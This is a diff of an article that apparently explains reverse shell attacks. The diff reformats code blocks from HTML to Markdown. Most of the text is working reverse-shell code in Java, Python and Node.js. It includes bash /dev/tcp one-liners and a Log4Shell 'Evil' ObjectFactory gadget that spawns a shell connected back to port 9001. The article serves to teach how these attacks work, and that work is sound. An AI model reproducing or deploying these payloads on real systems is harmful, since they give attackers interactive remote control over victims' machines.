@@ -67,7 +67,8 @@ Lastly, we connect the file descriptors (input, output and error) from the shell
 
 Java:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">public static void main(String[] args) throws IOException {
+```java
+public static void main(String[] args) throws IOException {
        Process process = new ProcessBuilder("bash").redirectErrorStream(true).start();
        Socket socket = new Socket("127.0.0.1", 9001);
        InputStream pInput = process.getInputStream();
@@ -78,30 +79,36 @@ Java:
        OutputStream sOutput = socket.getOutputStream();
 
        while (!socket.isClosed()) {
-           while (pInput.available() &gt; 0) sOutput.write(pInput.read());
-           while (pError.available() &gt; 0) sOutput.write(pError.read());
-           while (sInput.available() &gt; 0) pOutput.write(sInput.read());
+           while (pInput.available() > 0) sOutput.write(pInput.read());
+           while (pError.available() > 0) sOutput.write(pError.read());
+           while (sInput.available() > 0) pOutput.write(sInput.read());
            sOutput.flush();
            pOutput.flush();
        }
-}</pre>
+}
+```
+
 
 In this Java example, we route the process's `InputStream` and `ErrorStream` to the `OutputStream` of the remote socket connection. We also need to do this the other way around and write the `Socket OutputStream` into the `Inputstream` of the bash process.
 
 Python:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">import sys,socket,os,pty;
+```java
+import sys,socket,os,pty;
 
 s = socket.socket();
 s.connect(("127.0.0.1",9001));
 [os.dup2(s.fileno(),fd) for fd in (0,1,2)];
-pty.spawn("bash");</pre>
+pty.spawn("bash");
+```
+
 
 In this Python script, we connect the stdin, stdout and stderr to the socket connection. In Unix-like systems these are the first three file descriptors. Next we use pty to run `bash`.
 
 Node.js:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">var net = require("net");
+```java
+var net = require("net");
 var cp = require("child_process");
 var sh = cp.spawn("bash", []);
 var client = new net.Socket();
@@ -109,7 +116,9 @@ client.connect(9001, "127.0.0.1", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
-});</pre>
+});
+```
+
 
 This Node.js example is very similar to the Python example. We run `bash` and connect the standard file descriptors appropriately to the socket connection.
 
@@ -125,25 +134,33 @@ We can leverage these functions to call a one-liner shell command that initiates
 
 Java:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">public static void main(String[] args) throws IOException {
+```java
+public static void main(String[] args) throws IOException {
    String[] cmd = {
            "bash",
            "-c",
-           "exec 5&lt;&gt;/dev/tcp/127.0.0.1/9001;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done" };
+           "exec 5<>/dev/tcp/127.0.0.1/9001;cat <&5 | while read line; do $line 2>&5 >&5; done" };
 
    Runtime.getRuntime().exec(cmd);
-}</pre>
+}
+```
+
 
 Python:
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">import os;
+```java
+import os;
 
-os.system('bash -c "bash -i 5&lt;&gt; /dev/tcp/127.0.0.1/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5"')</pre>
+os.system('bash -c "bash -i 5<> /dev/tcp/127.0.0.1/9001 0<&5 1>&5 2>&5"')
+```
+
 
 Node.js
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">require('child_process').exec('bash -c "bash -i 5&lt;&gt; /dev/tcp/127.0.0.1/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5"')
-</pre>
+```java
+require('child_process').exec('bash -c "bash -i 5<> /dev/tcp/127.0.0.1/9001 0<&5 1>&5 2>&5"')
+```
+
 
 When you first execute the netcat command listening to port 9001, before executing this piece of code, you will notice that the connection is established and you can execute shell commands like the one below.
 
@@ -160,19 +177,22 @@ A great example is the \[Log4Shell vulnerability\](<https://snyk.io/blog/log4j-r
 
 It was possible to insert a gadget class that executed code when it was instantiated. Many of the examples showed how to launch the calculator or something harmless. Nevertheless, the code below would create a gadget for this infamous Log4j vulnerability. By exploiting Log4Shell now, you do not start up the calculator anymore but weaponize it into a reversed shell enabler.
 
-<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="dracula">public class Evil implements ObjectFactory {
+```java
+public class Evil implements ObjectFactory {
 
    @Override
-   public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+   public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        String[] cmd = {
                "/bin/bash",
                "-c",
-               "exec 5&lt;&gt;/dev/tcp/127.0.0.1/9001;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done" };
+               "exec 5<>/dev/tcp/127.0.0.1/9001;cat <&5 | while read line; do $line 2>&5 >&5; done" };
 
        Runtime.getRuntime().exec(cmd);
        return null;
    }
-}</pre>
+}
+```
+
 
 Almost all remote code executions can be used to enable a reverse shell attack. Other recent examples were \[Spring4Shell\](<https://snyk.io/blog/spring4shell-zero-day-rce-spring>- framework-explained/) and the \[Apache Commons Configuration RCE\](<https://snyk.io/blog/cve-2022-33980-apache-commons-configuration-rce>- vulnerability/).
 
